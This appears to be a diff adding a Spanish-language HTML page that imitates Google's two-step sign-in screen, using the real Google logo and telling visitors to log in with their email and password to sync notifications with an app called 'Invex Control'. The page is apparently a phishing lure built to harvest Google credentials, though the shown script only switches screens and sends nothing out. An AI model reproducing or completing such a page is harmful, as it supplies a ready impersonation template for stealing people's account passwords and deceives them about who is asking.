@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Sincronización Gmail</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      width: 380px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .logo-google {
+      width: 90px;
+      margin-bottom: 10px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      box-sizing: border-box;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+    }
+    .link {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .hidden {
+      display: none;
+    }
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      margin: 10px 0;
+    }
+    .checkbox-label input {
+      margin-right: 8px;
+    }
+    .avatar {
+      background-color: #dadce0;
+      color: #202124;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo-google" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo">
+
+    <!-- Pantalla 1 -->
+    <div id="pantallaCorreo">
+      <p style="font-size: 15px; color: #202124; margin-bottom: 10px;">
+        Para sincronizar tus notificaciones con la aplicación <strong>Invex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
+      </p>
+      <input type="text" id="correoInput" placeholder="Correo electrónico o teléfono">
+      <div>
+        <a href="#" class="link">¿Olvidaste el correo electrónico?</a>
+      </div>
+      <button class="btn" onclick="mostrarPantallaContrasena()">Siguiente</button>
+    </div>
+
+    <!-- Pantalla 2 -->
+    <div id="pantallaContrasena" class="hidden">
+      <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+        <div class="avatar" id="avatarLetra">G</div>
+        <span id="correoMostrado">correo@ejemplo.com</span>
+      </div>
+      <input type="password" id="contrasenaInput" placeholder="Ingresa tu contraseña">
+      <div class="checkbox-label">
+        <input type="checkbox" id="mostrarContrasena" onchange="toggleContrasena()">
+        <label for="mostrarContrasena">Mostrar contraseña</label>
+      </div>
+      <div>
+        <a href="#" class="link">¿Olvidaste la contraseña?</a>
+      </div>
+      <button class="btn">Siguiente</button>
+    </div>
+  </div>
+
+  <script>
+    function mostrarPantallaContrasena() {
+      const correo = document.getElementById('correoInput').value.trim();
+      if (correo) {
+        document.getElementById('pantallaCorreo').classList.add('hidden');
+        document.getElementById('pantallaContrasena').classList.remove('hidden');
+        document.getElementById('correoMostrado').textContent = correo;
+        document.getElementById('avatarLetra').textContent = correo[0].toUpperCase();
+      }
+    }
+
+    function toggleContrasena() {
+      const input = document.getElementById('contrasenaInput');
+      input.type = input.type === 'password' ? 'text' : 'password';
+    }
+  </script>
+</body>
+</html>
